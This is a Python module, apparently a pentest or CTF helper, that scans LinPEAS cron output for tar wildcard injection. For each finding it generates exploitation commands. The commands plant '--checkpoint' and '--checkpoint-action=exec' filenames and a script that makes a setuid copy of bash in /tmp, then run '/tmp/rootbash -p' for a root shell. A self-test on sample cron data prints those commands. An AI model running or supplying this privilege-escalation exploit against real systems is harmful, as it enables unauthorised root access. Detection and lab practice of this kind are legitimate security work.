"""Detect tar wildcard injection vulnerabilities in cron job scripts from LinPEAS output."""

import re
from typing import Dict, List, Optional, Tuple

# "Contents of /path/to/script.sh:" header lines
_CONTENTS_HEADER_RE = re.compile(r"^Contents of (/[^\s:]+):\s*$", re.IGNORECASE)

# Tar command that includes a wildcard (*) anywhere after tar
_TAR_WILDCARD_RE = re.compile(r"\btar\b[^;\n]*\*", re.IGNORECASE)

# Extract working directory from a preceding 'cd /path' on the same line
_CD_RE = re.compile(r"\bcd\s+(/\S+)")


def parse_wildcard_section(section_text: str) -> List[Tuple[str, str]]:
    """Return (script_path, working_dir) tuples for tar wildcard patterns found.

    Looks for 'Contents of /path/script:' headers immediately before lines that
    contain a tar wildcard command.  Also matches bare tar+wildcard lines without
    a preceding Contents header (script_path will be empty string in that case).
    Deduplicates by (script_path, working_dir).
    """
    results: List[Tuple[str, str]] = []
    seen: set = set()
    current_script: Optional[str] = None

    for line in section_text.splitlines():
        stripped = line.strip()

        # Track "Contents of /path/script.sh:" headers
        m = _CONTENTS_HEADER_RE.match(stripped)
        if m:
            current_script = m.group(1)
            continue

        # Reset script context on blank lines or new section markers
        if not stripped:
            current_script = None
            continue

        # Check for tar+wildcard on this line
        if _TAR_WILDCARD_RE.search(stripped):
            working_dir = ""
            cd_m = _CD_RE.search(stripped)
            if cd_m:
                working_dir = cd_m.group(1)

            script = current_script or ""
            key = (script, working_dir)
            if key not in seen:
                seen.add(key)
                results.append((script, working_dir))

    return results


def generate_commands(working_dir: str) -> List[str]:
    """Generate tar wildcard injection exploitation commands."""
    return [
        "echo '' > '--checkpoint=1'",
        "echo '' > '--checkpoint-action=exec=sh privesc.sh'",
        "echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > privesc.sh",
        "# Wait for cron — then run: /tmp/rootbash -p",
    ]


def analyze(section_text: str) -> List[Dict]:
    """Analyze LinPEAS cron section for tar wildcard injection vulnerabilities.

    Returns a HIGH finding for each unique tar+wildcard pattern discovered.
    """
    findings: List[Dict] = []
    for script_path, working_dir in parse_wildcard_section(section_text):
        findings.append({
            "script": script_path or "unknown",
            "working_dir": working_dir,
            "severity": "HIGH",
            "type": "wildcard_injection",
            "commands": generate_commands(working_dir),
        })
    return findings


# ── CLI self-test ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    SAMPLE = """
*/1 * * * * root /home/milesdyson/backups/backup.sh

Contents of /home/milesdyson/backups/backup.sh:
#!/bin/bash
cd /var/www/html && tar cf /home/milesdyson/backups/backup.tgz *
"""

    print("=== parse_wildcard_section ===")
    for script, wdir in parse_wildcard_section(SAMPLE):
        print(f"  script={script!r}  working_dir={wdir!r}")

    print("\n=== analyze ===")
    for finding in analyze(SAMPLE):
        print(f"[{finding['severity']}] {finding['type']} -> {finding['script']}")
        print(f"  working_dir: {finding['working_dir']}")
        for cmd in finding["commands"]:
            print(f"  $ {cmd}")
